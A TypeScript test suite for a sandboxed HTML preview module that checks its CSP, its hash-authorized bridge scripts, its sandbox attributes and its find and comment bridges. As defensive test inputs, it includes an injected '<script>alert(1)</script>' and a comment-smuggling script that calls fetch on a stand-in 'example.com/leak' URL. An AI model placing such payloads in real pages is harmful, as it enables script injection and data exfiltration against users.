import { test } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
// The preview boundary moved out of the Files component into one shared module when Scouts
// became a second surface rendering untrusted HTML. These assertions are unchanged: they are
// the contract BOTH surfaces now inherit, so they must keep passing from their new home.
import {
  HTML_PREVIEW_SANDBOX,
  htmlPreviewSource,
  inlinePreviewStyles,
} from "../src/web/lib/htmlPreview.ts";

/** One emitted bridge, found by a string only it contains. */
function bridgeContaining(marker: string): string {
  const bridge = [...htmlPreviewSource("ok").matchAll(/<script>([^<]+)<\/script>/g)]
    .map((match) => match[1]!)
    .find((script) => script.includes(marker));
  assert.ok(bridge, `no bridge contains ${marker}`);
  return bridge;
}

test("HTML preview prefixes a restrictive CSP before an existing head", () => {
  const source = htmlPreviewSource("<!doctype html><html><head><title>x</title></head><body>ok</body></html>");
  assert.match(source, /Content-Security-Policy/);
  assert.match(source, /default-src 'none'/);
  assert.match(source, /connect-src 'none'/);
  assert.match(source, /form-action 'none'/);
  assert.match(source, /navigate-to 'none'/);
  assert.ok(source.indexOf("Content-Security-Policy") < source.indexOf("<title>"));
});

test("every injected bridge is hash-authorized, and nothing else is", () => {
  // Recomputed from the emitted scripts rather than copied from the constants, so a
  // bridge edited without its hash - which fails invisibly, as a bridge that simply
  // does not run - fails HERE instead.
  //
  // FOUR since the find bridge landed. The extraction regex stops at the first `<`, so
  // this also pins the constraint that keeps it working: no bridge body may contain a
  // literal `<`. A comparison operator in one would truncate that script here and produce a
  // hash mismatch - which is the loud failure, and far better than the quiet one.
  const source = htmlPreviewSource("ok");
  const scripts = [...source.matchAll(/<script>([^<]+)<\/script>/g)].map((match) => match[1]!);
  assert.equal(scripts.length, 4);
  for (const script of scripts) assert.doesNotMatch(script, /</, "no bridge contains a literal <");
  const allowed = [...source.matchAll(/'sha256-([^']+)'/g)].map((match) => match[1]!);
  const hashes = scripts.map((script) => createHash("sha256").update(script).digest("base64"));
  assert.deepEqual(allowed.toSorted(), hashes.toSorted());
});

test("adding the find bridge moved no other bridge's hash", () => {
  // Non-goal 1 of the phase that added it, asserted rather than intended. These three are the
  // hashes that shipped before, written literally: the recomputation above proves the CSP
  // matches the emitted scripts, and only a literal can prove the SCRIPTS did not change. An
  // edit to one of the older bodies would still pass that test, silently altering the
  // boundary Scouts shares.
  const source = htmlPreviewSource("ok");
  for (const hash of [
    "0rx/acSQDoPQ3ODCtWXGEXkbl+oeGSA2rro56BhxnEk=",
    "E9uJHE7aVw0AWiMsFk0PxXrh8C4oaVMrpGEYB7ux98Y=",
    "0DQ6IkD0vFcUQsY+X6LP861dP2RW9HXIVdbSAi5MkBk=",
  ]) {
    assert.ok(source.includes(`'sha256-${hash}'`), `the CSP no longer admits ${hash}`);
  }
});

test("the CSP admits exactly four hashes and relaxes nothing else", () => {
  const source = htmlPreviewSource("ok");
  const csp = source.match(/content="([^"]+)"/)![1]!;
  assert.equal([...csp.matchAll(/'sha256-/g)].length, 4);
  assert.match(csp, /default-src 'none'/);
  assert.match(csp, /connect-src 'none'/);
  assert.match(csp, /form-action 'none'/);
  assert.match(csp, /navigate-to 'none'/);
  // The find bridge highlights through `::highlight()` rules in an inline style block, which
  // `style-src 'unsafe-inline'` already permitted - so it added no directive and no source.
  assert.match(csp, /style-src 'unsafe-inline'/);
  assert.doesNotMatch(csp, /unsafe-eval|'self'|https:|\*/);
  assert.doesNotMatch(source, /allow-same-origin/);
});

test("HTML fragments stay opaque and authorize only the four bridges", () => {
  const source = htmlPreviewSource("<h1>Hello</h1><script>alert(1)</script>");
  assert.match(source, /^<!doctype html><meta http-equiv="Content-Security-Policy"/);
  assert.doesNotMatch(source, /allow-same-origin/);
  assert.match(source, /event\.source===parent/);
  assert.match(source, /mission:file-preview-scroll/);
  assert.match(source, /mission:file-preview-link/);
  assert.match(source, /mission:file-preview-comment/);
  assert.match(source, /mission:file-preview-block/);
  assert.match(source, /mission:file-preview-ready/);
  assert.match(source, /mission:file-preview-keyboard/);
});

test("the preview keyboard bridge is inert until Files arms it", () => {
  const bridge = bridgeContaining("mission:file-preview-keyboard");
  assert.match(bridge, /missionKeyboard=false/);
  assert.match(bridge, /event\.source===parent/);
  assert.match(bridge, /event\.data\.enabled===true/);
  assert.match(bridge, /event\.key==="Tab"[\s\S]*preventDefault\(\)[\s\S]*event\.shiftKey[\s\S]*action:"exit"/);
  assert.match(bridge, /event\.key==="Escape"[\s\S]*action:"exit"/);
  assert.match(bridge, /event\.key==="u"\|\|event\.key==="d"[\s\S]*innerHeight/);
  assert.match(bridge, /event\.target\.isContentEditable/);
  assert.doesNotMatch(bridge, /\[contenteditable=/);
});

test("the preview target bridge follows only a structural path from its parent", () => {
  const bridge = bridgeContaining("mission:file-preview-target");
  assert.match(bridge, /event\.source===parent/);
  assert.match(bridge, /Array\.isArray\(path\)/);
  assert.match(bridge, /node\.children\.item\(step\.index\)/);
  assert.match(bridge, /child\.tagName\.toLowerCase\(\)!==step\.tag/);
  assert.match(bridge, /scrollIntoView\(\{block:"center",behavior:"smooth"\}\)/);
  assert.doesNotMatch(bridge, /textContent|innerText|innerHTML|outerHTML/);
});

test("the comment bridge announces itself, so arming it is never a guess about timing", () => {
  // A `srcdoc` document can fire a load event for the `about:blank` before it, so a parent
  // arming on load alone can post into a window that is about to be replaced - and the
  // message is lost with it, leaving comment mode on in the toolbar and off in the frame.
  // The ping is the LAST statement in the bridge, so it cannot be sent before the listeners
  // above it are installed.
  const bridge = bridgeContaining("mission:file-preview-block");
  assert.match(bridge, /parent\.postMessage\(\{type:"mission:file-preview-ready"\}," ?\*"\)$/);
});

test("the sandbox is one exported constant, and it grants scripts and nothing else", () => {
  // The whole reason `HTML_PREVIEW_SANDBOX` is exported rather than written at each iframe:
  // a token added here is a token added to Files AND to Scouts, so it can only be added on
  // purpose. `allow-scripts` alone runs the four hashed bridges.
  assert.equal(HTML_PREVIEW_SANDBOX, "allow-scripts");
});

test("the comment bridge is inert until the parent that owns the frame enables it", () => {
  const bridge = bridgeContaining("mission:file-preview-comment");
  // Armed only by a message from `parent`, which is the same test the scroll bridge makes.
  // Scouts never sends it, so an archived report behaves exactly as it did before this
  // bridge existed - and no other frame or extension can arm it either.
  assert.match(bridge, /event\.source!==parent/);
  assert.match(bridge, /missionCommenting=event\.data\.enabled===true/);
  // Every click path begins by checking that flag, so with comment mode off the bridge does
  // not even look at where the click landed.
  assert.match(bridge, /"click",event=>\{if\(!missionCommenting\)return/);
});

test("the comment bridge reports a structural path and never any text", () => {
  const bridge = bridgeContaining("mission:file-preview-block");
  // The path is element indices with tag names, walked up to `document.body` and no further.
  // Starting at body is what makes it independent of the CSP meta, these three scripts, and
  // a stylesheet this module inlined - all of which land in `<head>`.
  assert.match(bridge, /node!==document\.body/);
  assert.match(bridge, /index:\[\.\.\.owner\.children\]\.indexOf\(node\)/);
  assert.match(bridge, /tag:node\.tagName\.toLowerCase\(\)/);
  // Nothing that could carry document content up. A resolver that searched the source for a
  // block's words would refuse most real blocks; see `resolveHtmlBlockAnchor`.
  assert.doesNotMatch(bridge, /textContent|innerText|innerHTML|outerHTML/);
  // No new capability: it reads its own document and posts to its own parent. No fetch, no
  // navigation, no storage, no token.
  assert.doesNotMatch(bridge, /fetch|XMLHttpRequest|location|localStorage|sessionStorage|cookie/);
});

test("what counts as a block is computed, not enumerated", () => {
  // A tag allowlist is never finished. The one this replaced was missing `form`, `fieldset`,
  // `address` and `dialog`, and no list can see a `span` a stylesheet made `display:block` -
  // which reads to a person as a block and is a fair thing to point at. The preview renders
  // arbitrary checkout HTML, so "anything I enumerated" is the wrong set.
  const bridge = bridgeContaining("mission:file-preview-block");
  assert.match(bridge, /getComputedStyle\(el\)\.display/);
  assert.match(bridge, /shown!=="inline"&&shown!=="contents"&&shown!=="none"/);
  // The elements the old list happened to name must not reappear as a list anywhere.
  assert.doesNotMatch(
    bridge,
    /blockquote|figcaption|thead|tbody/,
    "the bridge must not carry a tag allowlist",
  );
  // SVG is decided by tag on purpose: an `svg` computes to `inline`, and its internals are
  // not CSS blocks at all, so display alone would skip the diagram or offer its strokes.
  assert.match(bridge, /tagName\.toLowerCase\(\)==="svg"/);
  // `body` bounds the walk - the whole document is not a block to comment on.
  assert.match(bridge, /el!==document\.body/);
});

test("the hover outline sits on the one element a click would take", () => {
  // The bridge marks that element itself. A CSS rule that restated the block definition in a
  // selector could outline a different box from the one a click resolves to, and both halves
  // would still "work" - the quiet kind of wrong. Computed display cannot be a selector at
  // all, so there is nothing to restate.
  const source = htmlPreviewSource("ok");
  const styles = [...source.matchAll(/<style>([^<]+)<\/style>/g)].map((match) => match[1]!);
  const style = styles.find((candidate) => candidate.includes("mission-comment-mode"))!;
  assert.match(style, /html\.mission-comment-mode \.mission-comment-block\{/);
  assert.doesNotMatch(style, /:has\(/, "no selector may restate which element is the block");
  assert.doesNotMatch(style, /blockquote|figcaption|thead|tbody/);
  // And the class it keys on is set by the bridge and nothing else.
  const bridge = bridgeContaining("mission:file-preview-block");
  assert.match(bridge, /classList\.add\("mission-comment-block"\)/);
  assert.match(bridge, /classList\.remove\("mission-comment-block"\)/);
});

test("the comment bridge takes the click before the link bridge can navigate it", () => {
  // Both listen on `document` in the capture phase, so registration order IS the behaviour:
  // `stopImmediatePropagation` only reaches listeners registered after this one. A paragraph
  // containing a link therefore takes a comment while comment mode is on.
  const source = htmlPreviewSource("ok");
  assert.ok(
    source.indexOf("mission:file-preview-comment") < source.indexOf("mission:file-preview-link"),
    "the comment bridge is injected before the link bridge",
  );
  const bridge = bridgeContaining("mission:file-preview-block");
  assert.match(bridge, /event\.preventDefault\(\);event\.stopImmediatePropagation\(\)/);
});

test("the link bridge claims authored navigation before scrolling fragments or posting links", () => {
  const source = htmlPreviewSource("ok");
  const bridge = [...source.matchAll(/<script>([^<]+)<\/script>/g)]
    .map((match) => match[1]!)
    .find((script) => script.includes("mission:file-preview-link"));
  assert.ok(bridge);
  // Every authored navigation is claimed before it is classified: fragments scroll inside
  // the document, while non-fragments cross the parent bridge instead of navigating it.
  assert.match(
    bridge,
    /preventDefault\(\).*startsWith\("#"\).*if\(!raw\).*scrollTo\(\{top:0\}\).*scrollIntoView\(\).*postMessage\(.*mission:file-preview-link/s,
  );
});

test("the find bridge is gated on its parent and announces its own readiness last", () => {
  const bridge = bridgeContaining("mission:file-preview-find");
  // The same gate the scroll and comment bridges make. No other frame can drive find.
  assert.match(bridge, /event\.source!==parent/);
  /*
   * The LAST statement, and its OWN message.
   *
   * `mission:file-preview-ready` is the comment bridge's, posted by the second of four
   * injected scripts, so it cannot speak for the fourth: the parent's first find message
   * would reach a window with no find listener and be lost, and nothing would highlight until
   * the reader edited the query. The capability rides on this message because incapacity is
   * not a result - a frame that cannot highlight must not answer a matching query with zero.
   */
  assert.match(
    bridge,
    /parent\.postMessage\(\{type:"mission:file-preview-find-ready",highlight:missionFindCan\(\),nonce:missionFindNonce\}," ?\*"\)$/,
  );
  // And it does not borrow the other bridge's ready message anywhere.
  assert.doesNotMatch(bridge, /"mission:file-preview-ready"/);
});

test("the find bridge inserts nothing into the document it highlights", () => {
  /*
   * The constraint that decided the whole implementation. The comment bridge addresses a
   * block by indexing element children from `document.body`, and the daemon resolves that
   * same path against a parse5 tree of the source - so a `mark` element wrapped around a
   * match would shift those indices and make a later comment anchor to a neighbour, silently.
   * Highlighting therefore goes through `CSS.highlights` and `Range`, which creates no node.
   */
  const bridge = bridgeContaining("mission:file-preview-find");
  assert.match(bridge, /CSS\.highlights\.set\("mission-find",/);
  assert.match(bridge, /CSS\.highlights\.set\("mission-find-current",/);
  assert.match(bridge, /document\.createRange\(\)/);
  assert.doesNotMatch(
    bridge,
    /createElement|createTextNode|appendChild|insertBefore|replaceChild|removeChild|innerHTML|outerHTML|insertAdjacent|classList|setAttribute/,
    "the find bridge must not mutate the previewed DOM",
  );
  // And no new capability: it reads its own document and posts to its own parent.
  assert.doesNotMatch(bridge, /fetch|XMLHttpRequest|location|localStorage|sessionStorage|cookie/);
});

test("the find bridge counts only text a reader can see, through three gates in order", () => {
  const bridge = bridgeContaining("mission:file-preview-find");
  // 1. By container. `inlinePreviewStyles` rewrites a checkout `link` into a `style` element
  //    wherever that link sat, so CSS text can appear in the BODY and not only in the head.
  assert.match(
    bridge,
    /missionFindSkip=\["script","style","template","title","noscript"\]/,
  );
  assert.match(bridge, /missionFindSkip\.includes\(tag\)/);
  /*
   * 2. By visibility, with every flag spelled out. `checkVisibility()` does NOT consider
   *    `visibility:hidden` or `opacity:0` by default - it answers `true` for both - so the
   *    bare call would pass exactly the text this bridge promises to exclude. Both the current
   *    and the original option spellings are passed, because unknown members are ignored and
   *    the two names shipped at different times.
   */
  for (const flag of [
    "visibilityProperty:true",
    "checkVisibilityCSS:true",
    "opacityProperty:true",
    "checkOpacity:true",
    "contentVisibilityAuto:true",
  ]) {
    assert.ok(bridge.includes(flag), `checkVisibility is missing ${flag}`);
  }
  assert.doesNotMatch(
    bridge,
    /checkVisibility\(\)/,
    "the bare call would pass hidden and transparent text",
  );
  // The fallback reads the nearest element's OWN computed `visibility`. That property
  // inherits and a descendant may re-assert `visible` inside a hidden subtree, so an ancestor
  // scan would wrongly drop text a reader can actually see.
  assert.match(bridge, /style\.visibility==="visible"/);
  /*
   * And the walk DESCENDS into a hidden element rather than stopping at it, carrying whether
   * the subtree is lit. Stopping is the same defect the fallback avoids, reached from the other
   * side: `visibility: hidden` on a div with `visibility: visible` on a paragraph inside puts
   * that paragraph on screen, and a walk that never entered the div could not find it however
   * carefully it asked about the element it did reach. A text node is eligible when the nearest
   * element above it is lit, which is the flag - so the gate is asked at every level.
   */
  assert.match(bridge, /if\(shown&&node\.data\)add\(node,node\.data\)/);
  assert.match(bridge, /const lit=space==="shown"/);
  assert.match(bridge, /walk\(node,lit\)/);
  assert.doesNotMatch(
    bridge,
    /space==="hidden"\)\{cut\(\);continue\}/,
    "a hidden element must not be terminal - a descendant can re-assert visibility",
  );
  // `display: none` IS still terminal: it removes the whole subtree from layout and no
  // descendant can put itself back.
  assert.match(bridge, /space==="gone"\)continue/);
  // The body's own visibility seeds the walk rather than being assumed.
  assert.match(bridge, /walk\(document\.body,missionFindSpace\(document\.body\)==="shown"\)/);
  // 3. By paintable geometry - and this is NOT a paintedness test, which is why gate 2 carries
  //    its own flags: hidden and fully transparent text is laid out and returns rects.
  assert.match(bridge, /range\.getClientRects\(\)\.length/);
});

test("the find bridge matches over runs and breaks them at every visible separation", () => {
  const bridge = bridgeContaining("mission:file-preview-find");
  // A per-node scan misses `foo<strong>bar</strong>` searched for `foobar`, which a reader sees
  // as one word, so eligible text nodes are joined and matched as one string.
  assert.match(bridge, /run\.text\+=text/);
  assert.match(bridge, /missionFindHits\(run\.text,re\)/);
  // A `br` is a visible line break with no text node of its own, and an element that
  // establishes its own box separates as firmly as a paragraph does. `missionBlock` is CALLED
  // rather than copied, so this bridge and the comment bridge answer "is this one box of text"
  // with the same definition instead of each keeping a tag list.
  assert.match(bridge, /tag==="br"\)\{cut\(\);continue\}/);
  // A run breaks on a VISIBILITY TRANSITION as much as on a box, which is what keeps the two
  // rules consistent once the walk descends into a hidden subtree: entering one breaks the run,
  // and a paragraph re-asserting `visible` inside it is broken away on both sides.
  assert.match(bridge, /const breaks=lit!==shown\|\|missionBlock\(node\)===node/);
  assert.doesNotMatch(bridge, /blockquote|figcaption|thead|tbody/, "no tag allowlist");
  // A node excluded for occupying NO space leaves the run intact - that text is absent from
  // what the reader sees, so the visible characters either side really are adjacent.
  assert.match(bridge, /if\(space==="gone"\)continue;/);
  // One logical hit is one Range even across text nodes, and the COUNT is logical hits.
  assert.match(bridge, /range\.setStart\(part\.node/);
  assert.match(bridge, /range\.setEnd\(part\.node/);
  assert.match(bridge, /count=missionFindRanges\.length/);
  /*
   * And a result names the document it counted in with a nonce this document MINTED FOR ITSELF.
   *
   * Two weaker schemes were tried and are pinned as rejected here. `event.source` sees one
   * WindowProxy across a `srcDoc` navigation, so it cannot tell the outgoing document from its
   * replacement. A token the parent sends down and the frame echoes fails for a sharper reason:
   * the parent posts through that same WindowProxy as soon as the source changes, before the
   * replacement has necessarily loaded, so the document being replaced can receive a token
   * naming its successor and answer for it out of its own DOM. Only a self-minted value is
   * beyond a predecessor's reach.
   */
  assert.match(bridge, /const missionFindNonce=Math\.random\(\)\+"-"\+Date\.now\(\)/);
  assert.match(bridge, /nonce:missionFindNonce/);
  // Never derived from anything the parent said, which is the whole guarantee.
  assert.doesNotMatch(bridge, /nonce:event\.data/);
  assert.doesNotMatch(bridge, /token:event\.data/);
  // The literal matcher is the same policy `documentFind.ts` applies, character for character.
  assert.ok(bridge.includes("replace(/[.*+?^${}()|[\\]\\\\]/g,\"\\\\$&\")"));
});

test("the find bridge's chord forwarding is inert until the parent sends a find message", () => {
  /*
   * Scouts shares this module and never sends one. An unconditional handler would cancel Cmd+F
   * inside an archived report and post it to a parent that ignores it, leaving that reader with
   * no find at all - the browser's own having been swallowed. Same shape as the keyboard
   * bridge's `missionKeyboard`, and the Files preview arms it on its first post.
   */
  const bridge = bridgeContaining("mission:file-preview-find-chord");
  assert.match(bridge, /missionFindArmed=false/);
  assert.match(bridge, /missionFindArmed=true/);
  assert.match(bridge, /"keydown",event=>\{if\(!missionFindArmed\)return/);
});

test("the find bridge forwards the chord it cancels, as a named message", () => {
  /*
   * A keystroke inside a sandbox reaches no dashboard listener - the scroll bridge forwards
   * only Tab and Escape - so Cmd+F with focus in the preview was simply lost. "The script
   * forwards the chord" describes no wire format, so the message is part of the contract, and
   * `preventDefault` runs first so the host browser's own find does not open over the
   * dashboard.
   */
  const bridge = bridgeContaining("mission:file-preview-find-chord");
  assert.match(
    bridge,
    /event\.altKey\|\|!event\.metaKey&&!event\.ctrlKey\)return;event\.preventDefault\(\);event\.stopImmediatePropagation\(\);parent\.postMessage\(\{type:"mission:file-preview-find-chord"\}/,
  );
});

test("a found match is painted by highlight pseudo-elements, in the app's find colours", () => {
  // Inside the frame because that is the only place it can be, and `style-src 'unsafe-inline'`
  // already permitted it - so this added no policy. The colours are literal: a custom property
  // declared on the dashboard's `:root` means nothing in a separate document.
  const source = htmlPreviewSource("ok");
  const styles = [...source.matchAll(/<style>([^<]+)<\/style>/g)].map((match) => match[1]!);
  const style = styles.find((candidate) => candidate.includes("::highlight("));
  assert.ok(style, "no injected style registers the find highlights");
  assert.match(style, /::highlight\(mission-find\)\{/);
  assert.match(style, /::highlight\(mission-find-current\)\{/);
  assert.match(style, /#e3b341/);
  // Comment mode keeps its own block, so neither bridge's affordance can be edited into the
  // other's by accident.
  assert.doesNotMatch(style, /mission-comment/);
});

test("a head-looking comment cannot swallow the preview CSP or its bridges", () => {
  const hostile = '<!-- <head> --><script>fetch("https://example.com/leak")</script>';
  const source = htmlPreviewSource(hostile);
  assert.ok(source.indexOf("Content-Security-Policy") < source.indexOf(hostile));
  assert.ok(source.indexOf("mission:file-preview-scroll") < source.indexOf(hostile));
  assert.ok(source.indexOf("mission:file-preview-link") < source.indexOf(hostile));
});

test("checkout-local stylesheets are inlined without weakening the preview CSP", async () => {
  const reads: string[] = [];
  const source = '<html><head><link rel="stylesheet" href="theme.css"></head><body>ok</body></html>';
  const hydrated = await inlinePreviewStyles(source, "docs/archive/mockups/index.html", async (path) => {
    reads.push(path);
    return ":root { --bg: #111; }";
  });
  assert.deepEqual(reads, ["docs/archive/mockups/theme.css"]);
  assert.doesNotMatch(hydrated, /<link/);
  assert.match(hydrated, /data-mission-source="docs\/archive\/mockups\/theme\.css"/);
  assert.match(hydrated, /--bg: #111/);
  const preview = htmlPreviewSource(hydrated);
  assert.match(preview, /style-src 'unsafe-inline'/);
  assert.doesNotMatch(preview, /allow-same-origin/);
});

test("unquoted local stylesheet attributes are inlined", async () => {
  const source = "<html><head><link rel=stylesheet href=theme.css></head><body>ok</body></html>";
  const hydrated = await inlinePreviewStyles(source, "docs/index.html", async (path) => (
    path === "docs/theme.css" ? "body { color: green; }" : null
  ));
  assert.doesNotMatch(hydrated, /<link/);
  assert.match(hydrated, /body \{ color: green; \}/);
});

test("remote stylesheets are neither fetched nor inlined", async () => {
  let read = false;
  const source = '<link rel="stylesheet" href="https://example.com/theme.css"><h1>ok</h1>';
  const hydrated = await inlinePreviewStyles(source, "index.html", async () => {
    read = true;
    return "";
  });
  assert.equal(read, false);
  assert.equal(hydrated, source);
});

test("stylesheet reads are deduplicated and concurrency-bounded", async () => {
  let active = 0;
  let peak = 0;
  const reads: string[] = [];
  const links = Array.from({ length: 40 }, (_, index) => (
    `<link rel="stylesheet" href="${index % 2 === 0 ? "shared" : `theme-${index}`}.css">`
  )).join("");
  await inlinePreviewStyles(links, "index.html", async (path) => {
    reads.push(path);
    active++;
    peak = Math.max(peak, active);
    await Promise.resolve();
    active--;
    return "body {}";
  });
  assert.equal(reads.filter((path) => path === "shared.css").length, 1);
  assert.ok(reads.length <= 32);
  assert.ok(peak <= 4);
});

test("obsolete stylesheet batches stop scheduling reads", async () => {
  const abort = new AbortController();
  let reads = 0;
  const links = Array.from({ length: 20 }, (_, index) => (
    `<link rel="stylesheet" href="theme-${index}.css">`
  )).join("");
  const hydrated = await inlinePreviewStyles(links, "index.html", async () => {
    reads++;
    abort.abort();
    return "body {}";
  }, abort.signal);
  assert.equal(hydrated, links);
  assert.ok(reads <= 4);
});
